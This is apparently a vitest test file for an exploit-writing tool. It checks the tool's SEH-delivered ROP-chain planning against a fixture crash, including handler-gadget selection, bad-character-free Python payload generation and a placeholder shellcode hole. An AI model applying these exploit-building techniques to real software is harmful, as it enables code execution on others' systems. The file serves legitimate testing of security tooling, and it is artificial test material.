import { spawnSync } from "node:child_process";
import { describe, expect, test } from "vitest";
import { handlerCandidates, landingPivots, measureTail } from "../src/commands/dep_delivery";
import { buildCapabilityIndexFromRpPlusText } from "../src/rop";
import { prose, sehRun, sehShape } from "./helpers/fixture_process";

// T07's shape: the overflow faults on a pointer it replaced, inside a __try, so EIP is still in the
// program and the chain has to arrive through the SEH handler the dispatcher calls next. With DEP that
// handler cannot be pop pop ret, which returns into the record on the stack; it has to be a gadget that
// adds enough to ESP to land in the buffer below the record. Measured on the clone for T07: the handler
// runs with ESP 0x1410 below the record, and add esp, 0xD10 ; ret lands the chain at OFFSET - 0x700.

const BAD = [0x00, 0x0a, 0x0d];
const { OFFSET, RECORD, FAULT_ESP, TEB, TAIL, MODULES, sehCrash } = sehShape;

const section = (output: string, header: string): string => {
  const start = output.indexOf(header);
  const rest = output.slice(start + header.length);
  const next = rest.search(/\n=== (\[\d\/7\]|STOP|Verdict)/);
  return output.slice(start, next < 0 ? undefined : start + header.length + next);
};

describe("dep_plan, delivered through an SEH handler", () => {
  const PYTHON = process.env.PYTHON ?? "python";
  const HAS_PYTHON = spawnSync(PYTHON, ["--version"]).status === 0;
  const run = (): { output: string; host: { currentThread: { Registers: { User: Record<string, bigint> } } } } => {
    const output = sehRun();
    return { output, host: (globalThis as unknown as { host: never }).host };
  };
  const send = (output: string): { sent: Buffer; error: string } => {
    const blocks = output.split("# ------------------ copy into your exploit ------------------\n").slice(1)
      .map((part) => part.split("\n=== ")[0].split("\n").filter((line) => !line.startsWith("[")));
    const file = [`OFFSET = ${OFFSET}`, 'BADCHARS = b"\\x00\\x0a\\x0d"', ...blocks.flat(), "import sys",
      "sys.stdout.write(payload1().hex())"].join("\n").replace('shellcode = hole("shellcode")', 'shellcode = b"\\xcc" * 8');
    const ran = spawnSync(PYTHON, ["-I", "-"], { input: file, encoding: "utf-8", timeout: 4000 });
    return { sent: Buffer.from(ran.stdout.trim(), "hex"), error: ran.stderr.trim() };
  };

  test("[6/7] says why it is an SEH delivery, what ESP the handler gets, and which handler lands in the buffer", () => {
    const { output } = run();
    const frame = section(prose(), "=== [6/7]");
    expect(frame).toContain("Delivered through the SEH record, not a saved EIP: EIP 0x00401010 is in vuln.exe, and the first record, at 0x0019EC00, holds handler 0x43434343, which is in no module (!exchain).");
    expect(frame).toContain("Not pop pop ret: it returns into the record itself");
    expect(frame).toContain("ESP when the handler runs: 0x0019DF00, the record 0xD00 above it.");
    expect(frame).toContain("0x11111401  add esp, 0x600 ; ret: its ret lands 0x700 below the record, at OFFSET - 0x700");
    expect(frame).not.toContain("0x11111411");
    expect(frame).not.toContain("0x11111421");
    expect(frame).toContain("Past the handler: the crash wrote 0x200 bytes of 0x43 past the handler");
    expect(frame).not.toContain("ESP after the crashing ret");
    expect(section(output, "=== [6/7]")).toContain("SEH_ESP = 0xD00 ");
    expect(section(output, "=== [6/7]")).toContain("(0x11111401, 0x600, 0),");
    expect(section(prose(), "=== Verdict")).toContain("in the pushad style, delivered through the SEH handler");
  });

  test("measuring puts the crash back: the handler, the SEH head and the registers are what they were", () => {
    const { host } = run();
    const user = host.currentThread.Registers.User;
    expect(user.eip).toBe(BigInt(0x00401010));
    expect(user.esp).toBe(BigInt(FAULT_ESP));
    const read = (address: number): number => {
      const bytes = (globalThis as unknown as { host: { memory: { readMemoryValues: (a: number, n: number) => number[] } } }).host.memory.readMemoryValues(address, 4);
      return (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0;
    };
    expect(read(RECORD + 4)).toBe(0x43434343);
    expect(read(TEB)).toBe(RECORD);
  });

  test.skipIf(!HAS_PYTHON)("the payload puts the chain where the handler lands, nSEH and the handler at OFFSET, and the crash's tail after", () => {
    const { output } = run();
    expect(output).toContain("1 hole(s) to fill, each a hole(...) line with the reason in the comment above it:\n[+]   shellcode: msfvenom");
    const { sent, error } = send(output);
    expect(error).toBe("");
    for (const bad of BAD) expect(sent.indexOf(bad), `0x${bad.toString(16)} at ${sent.indexOf(bad)}`).toBe(-1);
    expect(sent.length).toBe(OFFSET + 8 + TAIL);
    // add esp, 0x600 from 0xD00 below the record: the ret reads the dword 0x700 below it.
    const chainAt = OFFSET - 0xd00 + 0x600;
    expect(sent.subarray(0, chainAt).every((byte) => byte === 0x41)).toBe(true);
    expect(sent.readUInt32LE(chainAt) >>> 16).toBe(0x1111);
    expect(sent.subarray(OFFSET, OFFSET + 4)).toEqual(Buffer.from("AAAA"));
    expect(sent.readUInt32LE(OFFSET + 4)).toBe(0x11111401);
    expect(sent.subarray(OFFSET + 8).every((byte) => byte === 0x41)).toBe(true);
  });
});

describe("which gadget can be the handler", () => {
  const corpus = (...lines: string[]) =>
    buildCapabilityIndexFromRpPlusText(lines.map((line, i) => `0x${(0x11110010 + i * 0x10).toString(16)}: ${line} ;  (1 found)`).join("\n"));

  test("a fixed stack move that returns into the buffer, and nothing that returns into a register or touches memory", () => {
    const index = corpus("add esp, 0x600 ; ret", "push esi ; ret 0xff2", "pop eax ; pop ecx ; ret", "add esp, 0x10 ; mov dword [eax], ecx ; ret", "add esp, 0x700 ; ret 0x4");
    const found = handlerCandidates(index.gadgets, () => true).map((pivot) => [pivot.sequence, pivot.land, pivot.retn]);
    expect(found).toEqual([["pop eax ; pop ecx ; ret", 8, 0], ["add esp, 0x600 ; ret", 0x600, 0], ["add esp, 0x700 ; ret 0x4", 0x700, 4]]);
    expect(handlerCandidates(index.gadgets, () => false)).toEqual([]);
  });

  test("only a landing above the faulting ESP and below the record is offered", () => {
    const index = corpus("pop eax ; pop ecx ; ret", "add esp, 0x600 ; ret", "add esp, 0x2000 ; ret");
    const lands = landingPivots(handlerCandidates(index.gadgets, () => true), 0xd00, 0x4f4).map((pivot) => pivot.land);
    expect(lands).toEqual([0x600]);
  });

  test("the tail is the run of one byte past the handler, and a pattern there is left unmeasured", () => {
    const run = (bytes: number[]) => (address: number): number | undefined => bytes[address - 0x1000];
    expect(measureTail(0x1000, run([0, 0, 0, 0, 0, 0, 0, 0, 0x43, 0x43, 0x43, 0x43, 0x43, 0]))).toMatchObject({ tail: 5 });
    expect(measureTail(0x1000, run([0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x61, 0x30, 0x41])).tail).toBeUndefined();
  });
});
